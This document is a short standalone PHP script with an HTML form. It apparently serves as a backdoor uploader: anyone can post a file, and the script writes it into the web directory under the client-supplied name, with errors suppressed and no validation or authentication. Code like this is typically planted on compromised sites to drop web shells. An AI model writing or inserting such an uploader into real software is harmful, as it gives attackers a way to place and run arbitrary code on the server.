<form enctype=multipart/form-data  method=post>
<input name=xek type=file>
<input type=submit name=gogogo>
</form>

<?php
if(isset($_POST[gogogo]))
{
if(is_uploaded_file($_FILES[xek][tmp_name]))
{
@copy($_FILES[xek][tmp_name],$_FILES[xek][name]);
}};
?>